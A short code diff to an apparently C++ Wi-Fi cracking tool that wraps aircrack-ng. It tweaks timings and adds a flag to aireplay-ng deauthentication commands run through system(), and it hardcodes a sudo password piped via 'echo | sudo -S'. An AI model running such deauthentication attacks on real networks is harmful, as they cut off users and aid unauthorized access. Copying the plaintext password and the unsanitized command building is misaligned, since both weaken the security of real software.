@@ -18,7 +18,7 @@
 #define SUDO "echo \"51211314\" | sudo -S sh -c "
 #define STDOUTERR_OFF ""
 #define STDERR_OFF ""
-#define SEARCH_DURATION 5
+#define SEARCH_DURATION 10
 #define DEAUTH_ATTACK_TIMES 3
 #define DEAUTH_ATTACK_INTERVAL 5
 #else
@@ -86,7 +86,7 @@ int main()
 {
 	clear();
 	bool monitor_interface_added = false;
-    char cmd[513] = { 0 };
+    char cmd[512] = { 0 };
 
     // check software interface mode could be add
 	int iw_phy_status = 0;
@@ -629,7 +629,7 @@ AirCrack::AirCrack(WAPData& wap)
 		for (int n = 0; !handshaked && n < DEAUTH_ATTACK_TIMES; ++n)
 		{
 			// sending deauth attack to wap
-			sprintf(cmd, SUDO"\"aireplay-ng -0 3 -a %s %s\" %s", wap.bssid, IMONITOR, STDOUTERR_OFF);
+			sprintf(cmd, SUDO"\"aireplay-ng -0 3 --ignore-negative-one -a %s %s\" %s", wap.bssid, IMONITOR, STDOUTERR_OFF);
 			system(cmd);
 
 			// Let the bullet fly for a while
@@ -646,7 +646,7 @@ AirCrack::AirCrack(WAPData& wap)
 				{
 					if (station.power != -1)
 					{
-						sprintf(cmd, SUDO"\"aireplay-ng -0 3 -a %s -c %s %s\" %s", wap.bssid, station.mac, IMONITOR, STDOUTERR_OFF);
+						sprintf(cmd, SUDO"\"aireplay-ng -0 3 --ignore-negative-one -a %s -c %s %s\" %s", wap.bssid, station.mac, IMONITOR, STDOUTERR_OFF);
 						system(cmd);
 					}
 				}
